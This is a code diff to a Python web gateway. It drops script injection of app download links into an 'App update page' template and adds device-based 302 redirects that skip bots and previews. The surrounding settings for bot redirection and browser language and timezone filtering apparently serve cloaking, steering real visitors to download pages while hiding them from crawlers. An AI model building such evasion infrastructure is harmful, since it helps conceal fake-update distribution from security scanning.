@@ -213,10 +213,6 @@ SETTINGS_DEFAULTS = {
     "captcha_enabled": False,
     "captcha_ttl_seconds": CAPTCHA_TTL_DEFAULT,
     "captcha_max_tries": CAPTCHA_MAX_TRIES_DEFAULT,
-    # App 更新页（vpass-flow 模板）的分端跳转地址，后台可自定义
-    "app_android_url": "",
-    "app_ios_url": "",
-    "app_desktop_url": "",
     # 浏览器环境拦截（机器人检测的一部分，作用于人机验证之前）
     "browser_lang_check": False,
     "browser_lang_whitelist": [],
@@ -2088,7 +2084,6 @@ class Store:
             "client_redirect_rules", "client_redirect_enabled",
             "bot_redirect_enabled", "bot_redirect_url",
             "captcha_enabled", "captcha_ttl_seconds", "captcha_max_tries",
-            "app_android_url", "app_ios_url", "app_desktop_url",
             "browser_lang_check", "browser_lang_whitelist",
             "browser_tz_check", "browser_tz_whitelist",
             "rate_check_enabled", "rate_window_seconds", "rate_max_requests",
@@ -2233,54 +2228,6 @@ def safe_target_url(value) -> str:
         return ""
     parsed = urlparse(url)
     return url if parsed.scheme in ("http", "https") and parsed.netloc else ""
-
-
-def inject_app_links(content: bytes, settings: dict) -> bytes:
-    """Expose the operator-configured App download URLs to the update page.
-
-    Only pages that actually reference window.GW_APP_LINKS are touched, so the
-    other templates stay byte-identical to their source files. The snippet goes
-    right after <head> because the page reads it while its own scripts run.
-    """
-    if b"GW_APP_LINKS" not in content:
-        return content
-    # ===== 系统的核心设计规则：后台分流 > 模板流程 =====
-    # 后台「客户端分流跳转」里配了该端的地址 -> 一律用后台的；
-    # 模板内的「App 更新页跳转」只是未接入分流时的默认流程，不参与竞争。
-    # 分流开关关闭，或该端没配地址 -> 走模板流程（app_* 值，
-    # 为空时页面再回落到 pc_download.html 等模板内页面）。
-    rules = normalize_client_rules(settings.get("client_redirect_rules", {}))
-    split_on = bool(settings.get("client_redirect_enabled"))
-
-    def resolve(client, app_setting_key):
-        """分流优先；分流没配才用模板默认流程。"""
-        if split_on:
-            backend = safe_target_url((rules.get(client) or {}).get("url"))
-            if backend:
-                return backend
-        return safe_target_url(settings.get(app_setting_key))
-
-    links = {
-        "android": resolve(CLIENT_ANDROID, "app_android_url"),
-        "ios": resolve(CLIENT_IOS, "app_ios_url"),
-        "desktop": resolve(CLIENT_DESKTOP, "app_desktop_url"),
-        # 标记分流是否生效，排查时能一眼看出按钮最终用了哪套配置
-        "splitEnabled": split_on,
-    }
-    head_end = content.lower().find(b"</head>")
-    if head_end >= 0:
-        insert_at = head_end
-    else:
-        insert_at = content.lower().find(b"<body")
-        if insert_at < 0:
-            return content
-        insert_at = content.lower().find(b">", insert_at) + 1
-    script = (
-        "<script>window.GW_APP_LINKS="
-        + json.dumps(links, ensure_ascii=False)
-        + ";</script>"
-    ).encode("utf-8")
-    return content[:insert_at] + script + content[insert_at:]
 
 
 def click_capture_script(click_path: str) -> bytes:
@@ -4497,7 +4444,37 @@ class Handler(BaseHTTPRequestHandler):
         settings = STORE.get_settings()
         if self.gate_access(path, domain, ctx, settings):
             return
+        if self.enter_redirect(ctx, settings):
+            return
         return self.send_resolved_public(ctx, path, settings)
+
+    def enter_redirect(self, ctx: dict, settings: dict) -> bool:
+        """进入时分流：打开站点入口页时，按设备类型直接 302 到分流地址。
+
+        仅在分流开关开启、该设备（iOS/Android 可回落 unknown）配了地址时生效；
+        爬虫不参与（走爬虫专用跳转/拦截），本地预览不分流。
+        """
+        if not ctx.get("is_document") or self._preview_host:
+            return False
+        if not settings.get("client_redirect_enabled"):
+            return False
+        client_type, _ = self.current_client()
+        if client_type == CLIENT_BOT:
+            return False
+        rules = normalize_client_rules(settings.get("client_redirect_rules", {}))
+        candidates = [rules.get(client_type, {})]
+        if client_type in (CLIENT_IOS, CLIENT_ANDROID):
+            candidates.append(rules.get(CLIENT_UNKNOWN, {}))
+        for rule in candidates:
+            target = safe_target_url((rule or {}).get("url"))
+            if target:
+                self.send_response(302)
+                self.send_header("Location", target)
+                self.send_header("Cache-Control", "no-store")
+                self.send_header("X-Gateway-Rule", f"enter_split:{client_type}")
+                self.end_headers()
+                return True
+        return False
 
     def resolve_public_target(self, path: str, domain: dict) -> dict | None:
         """把请求路径解析成实际文件，并判定它是不是「文档页」。
@@ -4696,7 +4673,6 @@ class Handler(BaseHTTPRequestHandler):
         if content_type.startswith("text/") or content_type in ("application/javascript", "application/json"):
             content_type += "; charset=utf-8"
         if content_type.startswith("text/html"):
-            content = inject_app_links(content, settings)
             # 把写死的 /sites/<code>/ 资源前缀改回根路径，浏览器才会去 /assets/... 取文件
             content = SITES_PREFIX_RE.sub(b"/", content)
         redirect_links = normalize_redirect_links(settings.get("redirect_links", [])) if is_document else []
